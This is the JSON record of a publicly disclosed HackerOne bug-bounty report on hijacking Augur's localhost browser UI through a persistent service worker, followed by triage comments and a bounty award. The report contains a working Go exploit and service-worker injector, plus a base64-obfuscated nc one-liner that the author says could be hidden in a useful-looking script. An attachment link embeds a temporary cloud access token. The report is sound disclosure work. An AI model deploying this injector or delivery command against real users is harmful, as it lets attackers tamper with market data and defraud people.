@@ -1,0 +1,393 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-07-31T17:02:58.166Z", 
+    "voters": [
+        "michiel", 
+        "z3t", 
+        "foobar7", 
+        "kapytein", 
+        "s_p_q_r", 
+        "muon4", 
+        "mdv", 
+        "eveeez", 
+        "geeknik", 
+        "yusuf_furkan", 
+        "and 18 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "1000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 380594, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-07-31T16:40:54.404Z", 
+    "vulnerability_information": "## Augur UI hijack via dormant service workers\n\n![tldr](pwned.png)\n\n#### Augur background\n\nThe architecture of Augur currently consist of 3 individual layers:\n\n * At the lowest level, Augur consists of a batch of smart contracts built on top of Ethereum. This level is enforced by a global blockchain and can be accessed via gateway nodes operated either by the user or by a trusted remote entity.\n * At the middle level, Augur consists of an intermediate service layer that uses the (trusted) Ethereum gateway as its data source, builds a database out of the contract logs, serving the pre-prepared data for a web based UI.\n * At the highest level, Augur consists of a web UI served by the trusted Augur node, displayed by- and interacted through the **user's own local browser** through `http://localhost:8080`.\n\nThis report assumes that the Ethereum network, Ethereum gateway and Augur gateway can all be trusted and operate correctly. The report attacks the last link in the chain, the user's browser, causing arbitrary code to be injected in Augur's UI.\n\n#### Service workers background\n\n> A service worker is a script that your browser runs in the background, separate from a web page, opening the door to features that don't need a web page or user interaction. The core feature is the ability to intercept and handle network requests. ~ Google Developers\n\nTo expand a bit on the above short summary, service workers is a technology supported by all modern web browsers, permitting a website to register an arbitrary JavaScript to run as a background thread beneath a website. The primary goal is to allow offline caching, where the service worker can hijack network requests and can service them (including making arbitrary modifications to them). This enables such a JavaScript code to act as a temporary server when the user doesn't have an internet connection.\n\nFor a full rundown on the technology we refer the reader to [Google's developer page](https://developers.google.com/web/fundamentals/primers/service-workers/), but the interesting aspects from the point of view of this vulnerability report (beyond the core functionality of hijacking network requests) is the life cycle of service workers and their threat model:\n\n * A website can install a service worker at an arbitrary point in time. **That service worker remains in effect and executing until it is explicitly unregistered!** Service workers survive page refreshes, full forced uncached refreshes and even browser restarts. Service workers are **not tied** to the served content, a previously registered service worked will be active even for completely new, unrelated content.\n * Since service workers are from all intents and purposes **by-design** MITM attacks, they have a strict security policy of only running from HTTPS (ensuring that a website can only ever register code that hijacks its own content), and only running for the exact same **origin** they were registered from. **Localhost is an exception from the strict security policy to permit easy development.**\n\n I think you already have an idea where this is going...\n\n#### Exploit explained\n\nThe attack described in this document consists of abusing all modern browser's service worker security policy coupled with Augur's architectural design of running the UI in the user's browser to seamlessly hijack all Augur communication and also seamlessly inject arbitrary code into Augur's UI:\n\n * Augur's UI is running from `http://localhost:8080`, which is unauthenticated from an SSL perspective. Code from different sessions cannot be proven to belong (or not belong) to the same (or different) applications.\n * Browsers consider `localhost` as development environments, so they permit installing and executing service workers without SSL authentications.\n * Service workers will forever lay dormant in the browser (no cache control, no way to pre-detect) and will execute every time the same origin is loaded (`http://localhost:8080`).\n\n**Payload delivery**\n\nIn order to hijack Augur however, we need to install a service worker to `localhost:8080` in the first place. This requires running a malicious webserver **at least once** on the target machine and loading `http://localhost:8080` at least once in the user's web browser prior to Augur.\n\nBefore getting into how easy or hard this might be, lets demo an explicitly obvious way to do it to explain the attack better. Consider the following **fully working and fully self contained exploit** from Go:\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc main() {\n\t// Start a web-server on port 8080, serving the demo HTML and JS injector\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprint(w, index)\n\t})\n\thttp.HandleFunc(\"/pwner.js\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.Header().Set(\"Content-Type\", \"text/javascript\")\n\t\tfmt.Fprint(w, pwner)\n\t})\n\thttp.ListenAndServe(\":8080\", nil)\n}\n\nvar index = `\n<html>\n\n<script>\nif ('serviceWorker' in navigator) {\n  navigator.serviceWorker.register('/pwner.js')\n  .then(function(registration) {\n    console.log('Registration successful, scope is:', registration.scope);\n  })\n  .catch(function(error) {\n    console.log('Service worker registration failed, error:', error);\n  });\n}\n</script>\n\n<img id='gopher'/>\n<script>\n\tsetTimeout(function() {\n\t\tdocument.getElementById('gopher').src = 'https://gophercises.com/img/gophercises_jumping.gif';\n\t}, 1000)\n</script>\n</html>\n`\n\nvar pwner = `\n// Inject ourselves as the base service worker for Augur\nself.addEventListener('install', function(event) {\n  console.log('Service worker installing...');\n  self.skipWaiting();\n});\n\nself.addEventListener('activate', function(event) {\n  console.log('Service worker activating...');\n\tclients.claim();\n});\n\n// Hijack and HTTP requests, we're looking for script loads\nself.addEventListener('fetch', function(event) {\n  console.log('Fetching:', event.request.url);\n  if (event.request.url.startsWith(\"http://localhost:8080/main.\")) {\n    // Main Augur application is loading, inject our custom script into it\n    event.respondWith(fetch(event.request.url)\n    .then(function(response) {\n      return response.text();\n    })\n    .then(function(text) {\n      return new Response(text + '\\nsetTimeout(function() { alert(\"You are Pwned!\") }, 3000);');\n    }));\n  }\n});\n`\n```\n\nWhat this code does in short is:\n\n * Start a Go web server, serving two endpoints: `/` for the index and `/pwner.js` for the hijacking service worker.\n * The `index.html` page consists of a tiny script that registers `/pwner.js` as a service worker. It also displays a jumping gopher for the fun of it.\n * The `/pwner.js` service worker is a simple script that hijacks all network requests, prints a log for each, and if it encounders a request to `main.js` (augur's code), it injects some arbitrary JavaScript at the end.\n\nWe can run the above code via `go run exploit.go` (or whatever the name of the file is you saved it into), and load the page from a web browser. It will display a gopher, nothing else. If you check the JavaScript console however, you should see something along the lines of:\n\n```\nRegistration successful, scope is: http://localhost:8080/\npwner.js:4 Service worker installing...\npwner.js:9 Service worker activating...\npwner.js:15 Fetching: https://gophercises.com/img/gophercises_jumping.gif\n```\n\nAt this point you can terminate the Go attacker server and you can close your browser. The hijacker script has been successfully injected to intercept anything on the `localhost:8080` origin.\n\n**Payload execution**\n\nTime passes (arbitrary much, we don't even care) and the user eventually downloads and starts Augur from the official repository and/or client. This will start the Augur App, sync the local database from the Ethereum network. When sync is done, the user pushes the `Open Augur App` button, loading the Augur UI from the app in the user's browser.\n\nAt this point our previously dormant service worker starts executing, hijacking all network fetches between the UI and the backend service. This permits us to arbitrarily modify the data flow between the user and the service and also permits us to inject arbitrary JavaScript code into the UI itself.\n\nYou can see this via the JavaScript alert injected which displays **\"You are Pwned!\"**.\n\n#### Exploit impact\n\nThe impact of the exploit is actually quite significant. By having full control over the network traffic between the UI and the backend server; and also having full control over the UI contents, an attacker can display arbitrary Augur markets, shares, stats, etc.\n\nThe attacker **does not** have direct control over user funds, and the attacker **cannot** directly get the user to sign junk transactions. However by modifying the market descriptions and stats, the attacker **can** convince the user to place losing bets (e.g. invert the winning condition), causing loss of funds. The attacker can further place counter bets on the hijacked market, causing a direct gain of funds to themselves.\n\nFrom a technical perspective, the reason the exploit can be considered of a significant impact is because it **doesn't require elevated permissions** to run, after running a single time it **remains dormant forever** in the user's system and it's a **fully legitimate browser functionality**, so no exploit detection software can ever catch it.\n\n#### Exploit delivery\n\nThe hard part of the exploit however is delivering it to the end user in the first place. As explained above, browsers do enforce Same-Origin security policies against service workers, so the only way to attack Augur on the user's machine is to have the user load a malicious page from `localhost:8080` served by themselves.\n\nThe Go code above is a nice demo for this, but it's obviously not a realistic scenario. We need better social engineering attacks to deliver the exploit to the user's system.\n\n**Bash command**\n\nOne prevalent way nowadays to attack crypto-currency users is to get them to copy paste code from random web pages or chats into their terminal. While it may sound overly dumb, it does seem to work, especially since this particular attack doesn't even require root access. \n\nThe following 791 character bash command will do a full hijack injection including serving up 2 different webpages and automatically pointing the user's browser to load them and register the service worker.\n\n```bash\necho SFRUUC8xLjEgMjAwIE9LDQoNCjxzY3JpcHQ+bmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoJycpPC9zY3JpcHQ+ | base64 -d | nc -lN 8080 > /dev/null && echo SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvamF2YXNjcmlwdA0KDQpzZWxmLmFkZEV2ZW50TGlzdGVuZXIoImluc3RhbGwiLGZ1bmN0aW9uKGV2ZW50KXtzZWxmLnNraXBXYWl0aW5nKCl9KTtzZWxmLmFkZEV2ZW50TGlzdGVuZXIoImZldGNoIixmdW5jdGlvbihldmVudCl7aWYoZXZlbnQucmVxdWVzdC51cmwuc3RhcnRzV2l0aCgiaHR0cDovL2xvY2FsaG9zdDo4MDgwL21haW4uIikpe2V2ZW50LnJlc3BvbmRXaXRoKGZldGNoKGV2ZW50LnJlcXVlc3QudXJsKS50aGVuKGZ1bmN0aW9uKHJlc3BvbnNlKXtyZXR1cm4gcmVzcG9uc2UudGV4dCgpfSkudGhlbihmdW5jdGlvbih0ZXh0KXtyZXR1cm4gbmV3IFJlc3BvbnNlKHRleHQrYApzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7YWxlcnQoIllvdSBhcmUgUHduZWQhIil9LDMwMDApYCl9KSl9fSkK | base64 -d | nc -lN 8080 > /dev/null & xdg-open http://localhost:8080\n```\n\nWhilst it may look a bit innocuous, an attacker could easily hide this in a larger script that actually does something useful. Since the exploit injection doesn't **do** anything immediate, a vulnerable user will be oblivious of the dormant exploit on his machine waiting to execute.\n\n**Hijack 8080 services**\n\nPort `8080` on `localhost` is the de facto standard port for running just about any web service. Web developers are used to running their development code on it. Many services, monitoring tools, etc like to run on some variation of `8080`. This means hijacking port `8080` on developer machines has an elevated probability, since it only requires a few lines in any web dependency, which need to execute a single time, can be deleted afterwards without trace.\n\nAlthough developers will probably be reluctant to run arbitrary code on their machine (although lets be honest, we all ran **that awesome script** from GitHub for whatever reason), this exploit is particularly nasty as it runs in a fully sandboxed environment (user's browser), so noone expects that a single page load can leave arbitrary armed code behind.\n\n#### Suggestions\n\nAt the very core, it seems that running the Augur UI in the user's browser from `localhost` might not have been the most enlightened decision due to `origin` clashes. Browsers always treat `localhost` as a special snowflake when it comes to security policies and I can imagine plenty of future vulnerabilities might originate from this. If Augur is relying on Electron for a lot of its functinality, it might make sense to ship the entire browser with Augur too and to have a dedicated process solely for Augur. That would prevent old browser sessions leaking malicious scripts into new ones.\n\nRunning on port `8080` is again a less fortunate decision, since `origin` wise it clashes with just too many other providers and also clashes with developer's default choice. Running on some weird port number should not have any impact on user experience, but should make it a lot harder to deliver an exploit on that particular port opposed to the common 8080.\n\n## Impact\n\nThe impact of the exploit is actually quite significant. By having full control over the network traffic between the UI and the backend server; and also having full control over the UI contents, an attacker can display arbitrary Augur markets, shares, stats, etc.\n\nThe attacker **does not** have direct control over user funds, and the attacker **cannot** directly get the user to sign junk transactions. However by modifying the market descriptions and stats, the attacker **can** convince the user to place losing bets (e.g. invert the winning condition), causing loss of funds. The attacker can further place counter bets on the hijacked market, causing a direct gain of funds to themselves.\n\nFrom a technical perspective, the reason the exploit can be considered of a significant impact is because it **doesn't require elevated permissions** to run, after running a single time it **remains dormant forever** in the user's system and it's a **fully legitimate browser functionality**, so no exploit detection software can ever catch it.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "low", 
+            "privileges_required": "low", 
+            "user_interaction": "required", 
+            "attack_vector": "local", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "low", 
+            "availability": "low"
+        }, 
+        "rating": "low", 
+        "score": 3.8, 
+        "author_type": "Team"
+    }, 
+    "title": "Full UI hijack via dormant browser service workers", 
+    "is_member_of_team?": null, 
+    "vote_count": 28, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "https://github.com/AugurProject/augur", 
+        "max_severity": "medium", 
+        "databaseId": 10758, 
+        "asset_type": "SOURCE_CODE"
+    }, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$1,000", 
+    "attachments": [
+        {
+            "file_name": "pwned.png", 
+            "type": "image/png", 
+            "id": 319294, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/319/294/7367d87d28e88a3e78f828e9e167a811816073f9/pwned.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221827Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fa7bc6583561d137b71d49f944e2f2ee48e3a1d4da0286e2d6c5f70789816291"
+        }
+    ], 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-11T17:19:11.723Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-11T17:19:11.723Z", 
+            "actor": {
+                "username": "nuevoalex", 
+                "url": "/nuevoalex", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "augurproject", 
+            "message": "Thanks for the report @karalabe \n\nWe're discussing changing our default port to something a bit more unique and adding functionality to allow users to customize the port the UI will be served from.\n\nWe don't display the UI within electron currently just because of the lack of MetaMask support.\n\nExcellent write up!", 
+            "markdown_message": "<p>Thanks for the report <a href=\"/karalabe\">@karalabe</a> </p>\n\n<p>We&#39;re discussing changing our default port to something a bit more unique and adding functionality to allow users to customize the port the UI will be served from.</p>\n\n<p>We don&#39;t display the UI within electron currently just because of the lack of MetaMask support.</p>\n\n<p>Excellent write up!</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 3031669, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-14T01:28:05.044Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-14T01:28:05.044Z", 
+            "actor": {
+                "username": "petervecchiarelli", 
+                "url": "/petervecchiarelli", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Low (3.8)", 
+                "old_severity": "Medium (6.5)"
+            }, 
+            "team_handle": "augurproject", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 3043128, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-07-14T01:28:52.760Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-14T01:28:52.760Z", 
+            "actor": {
+                "url": "/augurproject", 
+                "profile": {
+                    "name": "Augur"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/024/066/109d493c62ac4f1e4468ed57c37c9e651b3ab7b9_medium.?1509325667"
+                }
+            }, 
+            "team_handle": "augurproject", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "1000.0", 
+            "collaborator": {
+                "username": "karalabe", 
+                "url": "/karalabe"
+            }, 
+            "message": "Thanks again karalabe, we've assessed this as a low severity vulnerability.", 
+            "markdown_message": "<p>Thanks again karalabe, we&#39;ve assessed this as a low severity vulnerability.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 3043129, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "karalabe", 
+                "url": "/karalabe"
+            }, 
+            "created_at": "2018-07-14T01:32:53.159Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-14T01:32:53.159Z", 
+            "actor": {
+                "username": "petervecchiarelli", 
+                "url": "/petervecchiarelli", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "augurproject", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 3043133, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-14T07:20:19.511Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-14T07:20:19.511Z", 
+            "actor": {
+                "username": "karalabe", 
+                "url": "/karalabe", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "augurproject", 
+            "message": "Sweet, thanks! Btw, any chance I could publish my report publicly? I can imagine many DApps will use a similar way to operate via localhost, could help them be a warning of the dangers. ", 
+            "markdown_message": "<p>Sweet, thanks! Btw, any chance I could publish my report publicly? I can imagine many DApps will use a similar way to operate via localhost, could help them be a warning of the dangers. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3043440, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-31T08:55:28.376Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-31T08:55:28.376Z", 
+            "actor": {
+                "username": "karalabe", 
+                "url": "/karalabe", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "augurproject", 
+            "message": "Gentle ping about publishing the report?", 
+            "markdown_message": "<p>Gentle ping about publishing the report?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3121380, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-31T16:36:17.573Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-31T16:36:17.573Z", 
+            "actor": {
+                "username": "tinybike", 
+                "url": "/tinybike", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/298/071/bbdb43b52f208f64c4d4c4f11a07b8a1a9eff937_medium.png?1530037211"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "augurproject", 
+            "message": "No objection from me, re: publishing the report.", 
+            "markdown_message": "<p>No objection from me, re: publishing the report.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3122874, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-31T16:40:54.451Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-31T16:40:54.451Z", 
+            "actor": {
+                "username": "tinybike", 
+                "url": "/tinybike", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/298/071/bbdb43b52f208f64c4d4c4f11a07b8a1a9eff937_medium.png?1530037211"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "augurproject", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3122882, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-31T17:02:58.237Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-31T17:02:58.237Z", 
+            "actor": {
+                "username": "karalabe", 
+                "url": "/karalabe", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "augurproject", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3123007, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-31T17:02:58.404Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-31T17:02:58.404Z", 
+            "actor": {
+                "username": "karalabe", 
+                "url": "/karalabe", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "augurproject", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3123008, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "karalabe", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/karalabe", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 70, 
+        "name": "Code Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2018-07-31T17:02:58.349Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/380594", 
+    "created_at": "2018-07-11T11:03:21.936Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"augur-ui-hijack-via-dormant-service-workers\">Augur UI hijack via dormant service workers</h2>\n\n<p>![tldr](pwned.png)</p>\n\n<h4 id=\"augur-background\">Augur background</h4>\n\n<p>The architecture of Augur currently consist of 3 individual layers:</p>\n\n<ul>\n<li>At the lowest level, Augur consists of a batch of smart contracts built on top of Ethereum. This level is enforced by a global blockchain and can be accessed via gateway nodes operated either by the user or by a trusted remote entity.</li>\n<li>At the middle level, Augur consists of an intermediate service layer that uses the (trusted) Ethereum gateway as its data source, builds a database out of the contract logs, serving the pre-prepared data for a web based UI.</li>\n<li>At the highest level, Augur consists of a web UI served by the trusted Augur node, displayed by- and interacted through the <strong>user&#39;s own local browser</strong> through <code>http://localhost:8080</code>.</li>\n</ul>\n\n<p>This report assumes that the Ethereum network, Ethereum gateway and Augur gateway can all be trusted and operate correctly. The report attacks the last link in the chain, the user&#39;s browser, causing arbitrary code to be injected in Augur&#39;s UI.</p>\n\n<h4 id=\"service-workers-background\">Service workers background</h4>\n\n<blockquote>\n<p>A service worker is a script that your browser runs in the background, separate from a web page, opening the door to features that don&#39;t need a web page or user interaction. The core feature is the ability to intercept and handle network requests. ~ Google Developers</p>\n</blockquote>\n\n<p>To expand a bit on the above short summary, service workers is a technology supported by all modern web browsers, permitting a website to register an arbitrary JavaScript to run as a background thread beneath a website. The primary goal is to allow offline caching, where the service worker can hijack network requests and can service them (including making arbitrary modifications to them). This enables such a JavaScript code to act as a temporary server when the user doesn&#39;t have an internet connection.</p>\n\n<p>For a full rundown on the technology we refer the reader to <a href=\"/redirect?signature=0a43805e1cd0558c226d6259332ad27166019b11&amp;url=https%3A%2F%2Fdevelopers.google.com%2Fweb%2Ffundamentals%2Fprimers%2Fservice-workers%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Google&#39;s developer page</span><i class=\"icon-external-link\"></i></a>, but the interesting aspects from the point of view of this vulnerability report (beyond the core functionality of hijacking network requests) is the life cycle of service workers and their threat model:</p>\n\n<ul>\n<li>A website can install a service worker at an arbitrary point in time. <strong>That service worker remains in effect and executing until it is explicitly unregistered!</strong> Service workers survive page refreshes, full forced uncached refreshes and even browser restarts. Service workers are <strong>not tied</strong> to the served content, a previously registered service worked will be active even for completely new, unrelated content.</li>\n<li>Since service workers are from all intents and purposes <strong>by-design</strong> MITM attacks, they have a strict security policy of only running from HTTPS (ensuring that a website can only ever register code that hijacks its own content), and only running for the exact same <strong>origin</strong> they were registered from. <strong>Localhost is an exception from the strict security policy to permit easy development.</strong>\n</li>\n</ul>\n\n<p>I think you already have an idea where this is going...</p>\n\n<h4 id=\"exploit-explained\">Exploit explained</h4>\n\n<p>The attack described in this document consists of abusing all modern browser&#39;s service worker security policy coupled with Augur&#39;s architectural design of running the UI in the user&#39;s browser to seamlessly hijack all Augur communication and also seamlessly inject arbitrary code into Augur&#39;s UI:</p>\n\n<ul>\n<li>Augur&#39;s UI is running from <code>http://localhost:8080</code>, which is unauthenticated from an SSL perspective. Code from different sessions cannot be proven to belong (or not belong) to the same (or different) applications.</li>\n<li>Browsers consider <code>localhost</code> as development environments, so they permit installing and executing service workers without SSL authentications.</li>\n<li>Service workers will forever lay dormant in the browser (no cache control, no way to pre-detect) and will execute every time the same origin is loaded (<code>http://localhost:8080</code>).</li>\n</ul>\n\n<p><strong>Payload delivery</strong></p>\n\n<p>In order to hijack Augur however, we need to install a service worker to <code>localhost:8080</code> in the first place. This requires running a malicious webserver <strong>at least once</strong> on the target machine and loading <code>http://localhost:8080</code> at least once in the user&#39;s web browser prior to Augur.</p>\n\n<p>Before getting into how easy or hard this might be, lets demo an explicitly obvious way to do it to explain the attack better. Consider the following <strong>fully working and fully self contained exploit</strong> from Go:</p>\n<pre class=\"highlight go\"><code><span class=\"k\">package</span><span class=\"x\"> </span><span class=\"n\">main</span><span class=\"x\">\n\n</span><span class=\"k\">import</span><span class=\"x\"> </span><span class=\"p\">(</span><span class=\"x\">\n    </span><span class=\"s\">&quot;fmt&quot;</span><span class=\"x\">\n    </span><span class=\"s\">&quot;net/http&quot;</span><span class=\"x\">\n</span><span class=\"p\">)</span><span class=\"x\">\n\n</span><span class=\"k\">func</span><span class=\"x\"> </span><span class=\"n\">main</span><span class=\"p\">()</span><span class=\"x\"> </span><span class=\"p\">{</span><span class=\"x\">\n    </span><span class=\"c\">// Start a web-server on port 8080, serving the demo HTML and JS injector</span><span class=\"x\">\n    </span><span class=\"n\">http</span><span class=\"o\">.</span><span class=\"n\">HandleFunc</span><span class=\"p\">(</span><span class=\"s\">&quot;/&quot;</span><span class=\"p\">,</span><span class=\"x\"> </span><span class=\"k\">func</span><span class=\"p\">(</span><span class=\"n\">w</span><span class=\"x\"> </span><span class=\"n\">http</span><span class=\"o\">.</span><span class=\"n\">ResponseWriter</span><span class=\"p\">,</span><span class=\"x\"> </span><span class=\"n\">r</span><span class=\"x\"> </span><span class=\"o\">*</span><span class=\"n\">http</span><span class=\"o\">.</span><span class=\"n\">Request</span><span class=\"p\">)</span><span class=\"x\"> </span><span class=\"p\">{</span><span class=\"x\">\n        </span><span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Fprint</span><span class=\"p\">(</span><span class=\"n\">w</span><span class=\"p\">,</span><span class=\"x\"> </span><span class=\"n\">index</span><span class=\"p\">)</span><span class=\"x\">\n    </span><span class=\"p\">})</span><span class=\"x\">\n    </span><span class=\"n\">http</span><span class=\"o\">.</span><span 